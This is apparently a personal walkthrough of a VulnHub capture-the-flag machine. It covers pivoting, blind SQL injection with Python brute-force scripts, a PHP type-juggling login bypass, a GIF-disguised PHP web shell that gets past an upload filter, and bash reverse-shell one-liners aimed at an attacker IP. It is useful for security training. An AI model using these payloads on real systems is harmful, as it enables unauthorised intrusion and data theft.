VulnHub

From BlackMarket machine, we start the hostDiscovery by using a script *HostDiscovery.sh* stored in /tmp/

`#!/bin/bash`
`for i in $(seq 1 254); do`
        `timeout 1 bash -c "ping -c 1 10.10.2.$i" &>/dev/null && echo "[+] Host 10.10.2. $i - Active" &` 
`done; wait`

but it doesn't find anything more than our IP, probably the host is not accepting ICMP,

![[Pasted image 20240316143639.png]]

We can try a port scanning by using a script *port.sh* which uses bash redirection /dev/tcp
`#!/bin/bash`
`for i in $(seq 128 254); do`
	`for port in 21 22 80 443 445 8080; do`
		`timeout 1 bash -c "echo ' ' > /dev/tcp/10.10.2.$i/$port" &>/dev/null && echo "[+] Host 10.10.2.$i - PORT $port - OPEN" &` 
	`done`0
`done; wait`
Now we found an IP 10.10.2.131 using port 80
![[Pasted image 20240316185359.png]]

## Pivoting
[[Pivoting]]

We transfer at first, the chisel client to the victim (BlackMarket) by launching an HTTP server for the transference:

`Attacker$ sudo python3 -m http.server 80`

`Victim$ wget http://192.168.4.170/chisel` *transference of chisel*

![[Pasted image 20240316190636.png]]
### Chisel
Attacker$./chisel server --reverse -p 1234 *reverse portforwarding by port 1234 as server mode*

Vicitim$

## Files Enumeration
We can use proxychains but is better to use natively *gobuster* proxy feature:

`$gobuster dir -h http://10.10.2.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -x html,php,txt --proxy socks5://127.0.0.1:1080``
`
![[Pasted image 20240317165052.png]]

We found a hidden base64 code as a js library
![[Pasted image 20240318030605.png]]
ZmxhZzJ7YVcxbVl
XUnRhVzVwYzNS
eVlYUnZjZz09fQ==

![[Pasted image 20240318030839.png]]
We found a directoy /imfadministrator

By inspecting the contant site, we find potential users to test in the administration portal

![[Pasted image 20240318035511.png]]
[[Username Enumeration]]
we verify if **rmichaels** (guessed by as upically usernames are created based on first name letter and lastname) exists by seeing a *invalid password* message

![[Pasted image 20240318051008.png]]

We can try a dictionary attack by using *hydra* or *burpsuite* but it doesn't work; however, we verify that he invalid user responses is built by using json.

By changing **pass** parameter, by becoming it an array, we get acces:
[[PHP Type Juggling]]
![[Pasted image 20240318051545.png]]

### Blind SQL Injection
[[Blind SQL Injection]]
We work in a URL parameter *?pagename=* adding " *'* ", and we see an error

![[Pasted image 20240318071355.png]]
#### Exploiting
 **Trying some payloads**
By using *home' and '1'='1* we verify that "Welcome to the IMF Administation" is displayed when the statement is **True**
![[Pasted image 20240318202233.png]]
If the payload is an error:  *'and '2'='1*, we see no message if statement id **False**
![[Pasted image 20240318200847.png]]

We infer that is a Blind SQL Injection and we can enumerate information.schema table by trying mysql as one *schema_name*
Payload:
*home' and (select schema_name from information_schema.schemata limit 2,1)='mysql*
![[Pasted image 20240318202536.png]]

Payload to get the fist letter of the the second database (information_schema) 

*home'+and+(select+substring(schema_name,1,1)+from+information_schema.schemata+limit+0,1)='i*

#### Script to automatize
#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Quitting...\n")
    sys.exit(1)


#Ctrl+C, define what to do after pressing SIGINT
signal.signal(signal.SIGINT, def_handler)

#Global variables
main_url = 'http://10.10.2.131/imfadministrator/cms.php?pagename=home'
characters = string.ascii_lowercase + '-_'

def makeRequest():
    cookies= {
            'PHPSESSID' : 'em7rebru0337e7ml01v5uqqpc0'
            }
    database = ""

    p1 = log.progress("Bruteforce")
    p1.status("Starting bruteforce process")

    time.sleep(2)

    p2 = log.progress("Databases")
    for dbs in range(0,5):
        for position_character in range(1, 30):
            for character in characters:
                sqli= main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"
                p2.status(sqli)
                r = requests.get(sqli, cookies=cookies)
                if "Welcome to the IMF Administration." in r.text:
                    database += character
                    p2.status(database)
                    break
        database += ","

if __name__ == '__main__':
    makeRequest()

Accounting to get tables
*home' and (select count(table_name) from information_schema.tables where table_schema='admin')='4*

4 return an False value so we can use BurpSuite tool Sniper to set many values
![[Pasted image 20240319182014.png]]

Based on length, there is only 1 table in admin database

#### Automation Script for Tables

#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Quitting...\n")
    sys.exit(1)


#Ctrl+C, define what to do after pressing SIGINT
signal.signal(signal.SIGINT, def_handler)

#Global variables
main_url = 'http://10.10.2.131/imfadministrator/cms.php?pagename=home'
characters = string.ascii_lowercase + '-_'

def makeRequest():
    cookies= {
            'PHPSESSID' : 'em7rebru0337e7ml01v5uqqpc0'
            }
    table = ""

    p1 = log.progress("Bruteforce")
    p1.status("Starting bruteforce process")

    time.sleep(2)

    p2 = log.progress("Tables")
    for dbs in range(0,1):
        for position_character in range(1, 30):
            for character in characters:
                sqli= main_url + f"'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"
                p1.status(sqli)
                r = requests.get(sqli, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    table += character
                    p2.status(table)
                    break
        table += ","

if __name__ == '__main__':
    makeRequest()

![[Pasted image 20240319182534.png]]

#### Column enumeration
Getting columns number
payload:
*home' and (select count(column_name) from information_schema.columns where table_schema='admin' and table_name='pages')='4* 
![[Pasted image 20240319183641.png]]
Result=3

Script to automatize

#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Quitting...\n")
    sys.exit(1)

#Ctrl+C, define what to do after pressing SIGINT
signal.signal(signal.SIGINT, def_handler)

#Global variables
main_url = 'http://10.10.2.131/imfadministrator/cms.php?pagename=home'
characters = string.ascii_lowercase + '-_'

def makeRequest():
    cookies= {
            'PHPSESSID' : 'em7rebru0337e7ml01v5uqqpc0'
            }
    table = ""

    p1 = log.progress("Bruteforce")
    p1.status("Starting bruteforce process")

    time.sleep(2)

    p2 = log.progress("Columns [DB:admin][Table:pages]")
    for dbs in range(0,4):
        for position_character in range(1, 30):
            for character in characters:
                sqli= main_url + f"'+and+(select+substring(column_name,{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"
                p1.status(sqli)
                r = requests.get(sqli, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    table += character
                    p2.status(table)
                    break
        table += ","

if __name__ == '__main__':
    makeRequest()
![[Pasted image 20240319184846.png]]
### Enumerating pagename column
We validate that the current database in *admin* by using this payload:
*home' and (select database())='admin*
![[Pasted image 20240320180519.png]]
Message *True*

##### Code:
**Note:** If response was not true, then we need to specify admin.pages as table:

#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Quitting...\n")
    sys.exit(1)

#Ctrl+C, define what to do after pressing SIGINT
signal.signal(signal.SIGINT, def_handler)

#Global variables
main_url = 'http://10.10.2.131/imfadministrator/cms.php?pagename=home'
characters = string.ascii_lowercase + '-_'

def makeRequest():
    cookies= {
            'PHPSESSID' : 'em7rebru0337e7ml01v5uqqpc0'
            }
    table = ""

    p1 = log.progress("Bruteforce")
    p1.status("Starting bruteforce process")

    time.sleep(2)

    p2 = log.progress("Data[DB:admin][Table:pages][Column:pagename]")
    for dbs in range(0,4):
        for position_character in range(1, 30):
            for character in characters:
                sqli= main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
                p1.status(sqli)
                r = requests.get(sqli, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    table += character
                    p2.status(table)
                    break
        table += ","

if __name__ == '__main__':
    makeRequest()
    
    
We found new directory *tutorials-incomplete*
![[Pasted image 20240320181235.png]]

![[Pasted image 20240320181337.png]]

We found a QR with a flag:
![[Pasted image 20240320182337.png]]
![[Pasted image 20240320182517.png]]

`$echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d;echo` 
>uploadr942.php

We found  new upload site
![[Pasted image 20240320182712.png]]

## Upload malicious file
[[WAF Bypass ]]
[[Abusing File Upload Form]]

Trying to upload a php file we've got invaid file type
We can try loading many types of extensions to verify:

#### Burpsuite configuration
Adding extensions to test:
![[Pasted image 20240320184622.png]]
Configuration of Intruder and Grep - Extract to capture the error message
![[Pasted image 20240320184520.png]]

We've got invalid file type for all, then we can try changing the **Content-type** header to **image/jpg** and we've got now Crappy WAF detected which is a WAF blocking our hidden php payload.
![[Pasted image 20240320190433.png]]
![[Pasted image 20240320190558.png]]
![[Pasted image 20240320190729.png]]


### WAF Bypass
We've got the error message by trying *system*, *shell_exec* our *passthru* ( PHP function used to execute an external command), we will bypass this security measure by sing *echo `command`*
#### Changing magic numbers and function
GIF8 is the magic number of GIF in order to deceive the portal that it's an GIF file and trying to upload a command execution code.
payload:

GIF8;
<?php
	$command=$_GET['cmd'];echo `$command`;
?>

Now we see it was sucessful and it was stored using a name file in the server.
![[Pasted image 20240320194623.png]]

#### Inspecting upload file and getting a shell

Inspecting */uploads* directory, we notice that it's giving a forbidden message
![[Pasted image 20240320194901.png]]
Looking for the filename *b763e4c2fe5c.gif* and his extension, we try using an *id* command:

![[Pasted image 20240320195038.png]]
The reason by a GIF file executes PHP commands it's because there is a file called **.htaccess** inserver with this instructions:
![[Pasted image 20240320200246.png]]
![[Pasted image 20240320200809.png]]

If this file doesn't existe, we can creating specifying which extensions we will use to execute php files.

Generating a reverse shell:
Injecting: `bash -c "bash -i >& /dev/tcp/10.10.2.129/4444 0>&1"` in ULR code

bash -c "bash -i >%26 /dev/tcp/10.10.2.129/5554 0>%261"
